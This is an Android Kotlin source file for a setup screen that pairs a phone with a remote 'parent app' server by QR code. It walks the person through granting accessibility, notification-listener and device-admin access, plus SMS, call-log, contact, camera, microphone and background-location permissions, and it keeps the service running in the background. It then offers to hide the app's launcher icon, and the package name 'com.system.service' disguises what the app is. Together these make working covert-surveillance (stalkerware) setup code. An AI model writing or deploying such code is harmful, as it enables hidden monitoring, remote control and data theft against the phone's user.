package com.system.service.setup

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.journeyapps.barcodescanner.ScanContract
import com.journeyapps.barcodescanner.ScanIntentResult
import com.journeyapps.barcodescanner.ScanOptions
import com.system.service.R
import com.system.service.core.CoreService
import com.system.service.core.DeviceAdminReceiver
import com.system.service.monitors.NotificationMonitor

class SetupActivity : AppCompatActivity() {

    private var currentStep = 0

    // QR format: "wss://your-app.replit.app/api/ws|PAIR_CODE"
    private val qrScanLauncher = registerForActivityResult(ScanContract()) { result: ScanIntentResult ->
        result.contents?.let { scanned ->
            val parts = scanned.split("|")
            val url = parts[0].trim()
            val code = if (parts.size > 1) parts[1].trim() else ""

            if (url.startsWith("ws://") || url.startsWith("wss://")) {
                CoreService.SERVER_URL = url
                getSharedPreferences(CoreService.PREFS_NAME, MODE_PRIVATE).edit()
                    .putString(CoreService.KEY_SERVER_URL, url)
                    .putString(CoreService.KEY_PAIR_CODE, code)
                    .apply()
                showStep(1)
            } else {
                Toast.makeText(this, "Invalid QR — scan parent app ka Settings QR", Toast.LENGTH_LONG).show()
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_setup)

        val prefs = getSharedPreferences(CoreService.PREFS_NAME, MODE_PRIVATE)
        val savedUrl = prefs.getString(CoreService.KEY_SERVER_URL, null)
        if (savedUrl != null) CoreService.SERVER_URL = savedUrl
        showStep(0)
    }

    override fun onResume() {
        super.onResume()
        Handler(Looper.getMainLooper()).postDelayed({
            if (currentStep in 1..7 && isPermissionGranted(currentStep)) {
                showStep(currentStep + 1)
            }
        }, 1500)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 100) showStep(8)
    }

    private fun showStep(step: Int) {
        currentStep = step
        when (step) {
            0 -> updateUI("Setup", "Server URL",
                "Parent app ke Settings se QR scan karo (URL + pair code dono)", "Scan QR Code") {
                val options = ScanOptions().apply {
                    setDesiredBarcodeFormats(ScanOptions.QR_CODE)
                    setPrompt("Parent app ki Settings tab ka QR scan karo")
                    setCameraId(0); setBeepEnabled(false)
                }
                qrScanLauncher.launch(options)
            }
            1 -> updateUI("1/6", "Notification Access",
                "Required for notification monitoring", "Enable") {
                startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            }
            2 -> updateUI("2/6", "Accessibility Access",
                "Required for remote control & chat monitoring", "Enable") {
                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            }
            3 -> updateUI("3/6", "Device Management",
                "Required for screen lock", "Activate") {
                val i = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                    ComponentName(this, DeviceAdminReceiver::class.java))
                i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for device security")
                startActivity(i)
            }
            4 -> updateUI("4/7", "Battery Optimization",
                "Keep service running always in background", "Disable") {
                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:$packageName")))
            }
            5 -> {
                // Realme / OPPO / Vivo autostart — different intent per brand
                val brand = android.os.Build.BRAND.lowercase()
                val mfr   = android.os.Build.MANUFACTURER.lowercase()
                val desc  = when {
                    brand.contains("realme") || mfr.contains("realme")  ->
                        "Realme: Settings → Battery → Autostart → Enable this app"
                    brand.contains("oppo")   || mfr.contains("oppo")    ->
                        "OPPO: Settings → Battery → App Quick Freeze → Allow"
                    brand.contains("vivo")   || mfr.contains("vivo")    ->
                        "Vivo: Settings → Battery → Background App Management → Allow"
                    brand.contains("xiaomi") || mfr.contains("xiaomi") ||
                    brand.contains("redmi")  ->
                        "Xiaomi: Settings → App info → Battery Saver → No restrictions"
                    brand.contains("huawei") || brand.contains("honor") ->
                        "Huawei: Phone Manager → Startup Manager → Enable this app"
                    else ->
                        "Enable Autostart for this app in your phone's Settings → Battery"
                }
                updateUI("5/7", "Autostart Permission ← REALME IMPORTANT",
                    desc, "Open Settings") {
                    openAutostartSettings()
                }
            }
            6 -> updateUI("6/7", "Display Permission",
                "Required for overlay alerts", "Allow") {
                startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:$packageName")))
            }
            7 -> updateUI("7/7", "Final Permissions",
                "Camera, Mic, Location, Calls, SMS, Contacts", "Allow All") {
                val permsToRequest = mutableListOf<String>()
                // BUG FIX: READ_CONTACTS and READ_PHONE_NUMBERS were missing —
                // contact blocking and call-log enrichment silently failed without them.
                val allPerms = buildList {
                    add(android.Manifest.permission.CAMERA)
                    add(android.Manifest.permission.RECORD_AUDIO)
                    add(android.Manifest.permission.ACCESS_FINE_LOCATION)
                    // Bug #26 fix: Android 11+ requires separate runtime request for background location
                    // Must be requested AFTER FINE_LOCATION is granted (system enforces this order)
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
                        add(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                    }
                    add(android.Manifest.permission.READ_CALL_LOG)
                    add(android.Manifest.permission.READ_SMS)
                    add(android.Manifest.permission.READ_PHONE_STATE)
                    add(android.Manifest.permission.READ_PHONE_NUMBERS)
                    add(android.Manifest.permission.READ_CONTACTS)
                    // POST_NOTIFICATIONS required on Android 13+ for foreground service notification
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
                        add(android.Manifest.permission.POST_NOTIFICATIONS)
                    }
                }
                for (perm in allPerms) {
                    if (checkSelfPermission(perm) != PackageManager.PERMISSION_GRANTED)
                        permsToRequest.add(perm)
                }
                if (permsToRequest.isEmpty()) showStep(8)
                else requestPermissions(permsToRequest.toTypedArray(), 100)
            }
            8 -> showFinalStep()
        }
    }

    private fun openAutostartSettings() {
        val brand = android.os.Build.BRAND.lowercase()
        val mfr   = android.os.Build.MANUFACTURER.lowercase()
        val intents = mutableListOf<Intent>()
        when {
            brand.contains("realme") || mfr.contains("realme") ||
            brand.contains("oppo")   || mfr.contains("oppo")   -> {
                intents += Intent().setClassName("com.coloros.safecenter",
                    "com.coloros.safecenter.permission.startup.StartupAppListActivity")
                intents += Intent().setClassName("com.oppo.safe",
                    "com.oppo.safe.permission.startup.StartupAppListActivity")
                intents += Intent().setClassName("com.coloros.oppoguardelf",
                    "com.coloros.powermanager.powersaver.PowerUsageModelActivity")
            }
            brand.contains("vivo") || mfr.contains("vivo") -> {
                intents += Intent().setClassName("com.vivo.permissionmanagement",
                    "com.vivo.permissionmanagement.activity.SoftPermissionDetailActivity")
            }
            brand.contains("xiaomi") || mfr.contains("xiaomi") || brand.contains("redmi") -> {
                intents += Intent().setClassName("com.miui.securitycenter",
                    "com.miui.permcenter.autostart.AutoStartManagementActivity")
            }
            brand.contains("huawei") || brand.contains("honor") -> {
                intents += Intent().setClassName("com.huawei.systemmanager",
                    "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity")
            }
        }
        // Fallback: open battery settings
        intents += Intent(Settings.ACTION_BATTERY_SAVER_SETTINGS)
        intents += Intent(Settings.ACTION_SETTINGS)

        for (intent in intents) {
            try {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
                return
            } catch (_: Exception) {}
        }
    }

    private fun showFinalStep() {
        currentStep = 8
        findViewById<TextView>(R.id.tvStep).text = "Done!"
        findViewById<TextView>(R.id.tvTitle).text = "Setup Complete"
        findViewById<TextView>(R.id.tvDesc).text = "Service is now running in background"

        try { startForegroundService(Intent(this, CoreService::class.java)) } catch (_: Exception) {}

        val btnAction = findViewById<Button>(R.id.btnAction)
        btnAction.text = "Hide App Icon"
        btnAction.backgroundTintList =
            android.content.res.ColorStateList.valueOf(0xFFFF5722.toInt())
        btnAction.setOnClickListener {
            hideIcon()
            Toast.makeText(this, "Icon hidden! Use parent app to manage.", Toast.LENGTH_LONG).show()
            finishAffinity()
        }

        val btnNext = findViewById<Button>(R.id.btnNext)
        btnNext.text = "Keep Icon Visible & Finish"
        btnNext.backgroundTintList =
            android.content.res.ColorStateList.valueOf(0xFF4CAF50.toInt())
        btnNext.setOnClickListener { finishAffinity() }
    }

    private fun hideIcon() {
        // BUG FIX: Disabling SetupActivity itself breaks the running service because
        // the OS can refuse to start a disabled component.  The correct approach is to
        // disable ONLY the activity-alias that carries the LAUNCHER intent-filter —
        // all OEM launchers (Realme/ColorOS/OPPO/Vivo/Samsung/Xiaomi) honour
        // alias component state without caching stale shortcuts.
        listOf(
            "$packageName.setup.LauncherAlias",
            "$packageName.setup.SetupActivityAlias"
        ).forEach { aliasName ->
            try {
                packageManager.setComponentEnabledSetting(
                    ComponentName(packageName, aliasName),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
            } catch (_: Exception) {}
        }
    }

    private fun isPermissionGranted(step: Int): Boolean {
        return when (step) {
            1 -> isNotificationEnabled()
            2 -> isAccessibilityEnabled()
            3 -> isDeviceAdminEnabled()
            4 -> (getSystemService(POWER_SERVICE) as PowerManager)
                    .isIgnoringBatteryOptimizations(packageName)
            5 -> true   // Autostart — can't verify programmatically, user must confirm manually
            6 -> Settings.canDrawOverlays(this)
            else -> true
        }
    }

    private fun isNotificationEnabled(): Boolean {
        val cn = ComponentName(this, NotificationMonitor::class.java)
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat?.contains(cn.flattenToString()) == true
    }

    private fun isAccessibilityEnabled(): Boolean {
        val cn = ComponentName(packageName, "com.system.service.monitors.AccessibilityMonitor")
        val flat = cn.flattenToString()
        val enabled = Settings.Secure.getString(
            contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
        return enabled.contains(flat)
    }

    private fun isDeviceAdminEnabled(): Boolean {
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        return dpm.isAdminActive(ComponentName(this, DeviceAdminReceiver::class.java))
    }

    private fun updateUI(
        step: String, title: String, desc: String, btnText: String, action: () -> Unit
    ) {
        findViewById<TextView>(R.id.tvStep).text = "Step $step"
        findViewById<TextView>(R.id.tvTitle).text = title
        findViewById<TextView>(R.id.tvDesc).text = desc
        val btnAction = findViewById<Button>(R.id.btnAction)
        btnAction.text = btnText
        btnAction.backgroundTintList =
            android.content.res.ColorStateList.valueOf(0xFF2196F3.toInt())
        btnAction.setOnClickListener { action() }
        val btnNext = findViewById<Button>(R.id.btnNext)
        btnNext.text = "Already Done - Next"
        btnNext.backgroundTintList =
            android.content.res.ColorStateList.valueOf(0xFF333333.toInt())
        btnNext.setOnClickListener { showStep(currentStep + 1) }
    }
}
